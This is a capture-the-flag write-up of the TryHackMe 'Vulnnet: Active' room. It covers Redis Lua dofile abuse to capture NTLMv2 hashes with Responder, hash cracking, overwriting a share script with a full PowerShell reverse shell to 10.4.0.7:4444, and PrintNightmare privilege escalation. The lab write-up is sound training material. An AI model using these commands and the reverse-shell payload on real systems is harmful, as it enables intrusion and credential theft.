# Vulnnet: Active

https://tryhackme.com/room/vulnnetactive

I found this room very hard, with a bunch of new techniques I haven't seen before. So worth writing up.

1. Enumeration reveals a bunch of ports, though notably no web port, ssh or rdp. Even though its a windows machine, the only interaction seems to be via SMB and an exposed Redis instance on 6379.
2. The Redis instance was running version 2.8, and did not require authentication. It contained no keys of note. However, this version of Redis contains a 'vulnerability' where you can use 'dofile' in the LUA sandbox, allowing you to access files or network shares. E.g. `EVAL "dofile('/etc/passwd')" 0` would work on a linux machine.
3. For a windows machine, notably, this can be used to access network shares. Which means, if I set up responder, I might be able to catch a hash.
4. Setting up responder from this repo (the new version, 3.0+), https://github.com/lgandx/Responder, then using something like `EVAL "dofile('//yourip//share')" 0` will catch an NTMLv2 hash.
5. This can be cracked using hashcat, using -m 5600 and rockyou, to reveal the password for user 'enterprise-security'.
6. With the username and password, the shares can be enumerated with smbclient revealing and accessing 'enterprise-share'. In here is a powershell file, named purge...ps1
7. By replacing this file with a new one containing a rev shell payload, a rev shell can be established. I used the following payload:

```
$client = New-Object System.Net.Sockets.TCPClient('10.4.0.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Simply place this in a file with the same name as the script, and put onto the share (it will overrite the existing one). Then set up a listener and wait.

8. The rev shell will be established momentarily. However, to improve it, generate a msfvenom rev shell (windows/x64/shell_reverse_tcp), upload it to the share, then run it with your rev shell. This will grant a more stable shell that also correctly outputs stderror.
9. The intended path to privesc looks to be GPO abuse: https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/ and using a tool like https://labs.f-secure.com/tools/sharpgpoabuse. However I couldn't a) fully understand this and b) get sharpgpoabuse working (likely because I was using the basic rev shell). Instead, print nightmare works
10. This version of print nightmare is a simple powershell script: https://github.com/calebstewart/CVE-2021-1675. Upload it using the share, then import it and run it as shown on the readme. It will quickly generate a user (if run with no args, this will be the user `adm1n`, note the `1`).
11. To get the final flag, the new user can be used with the share `c$` to enumerate the system fully.
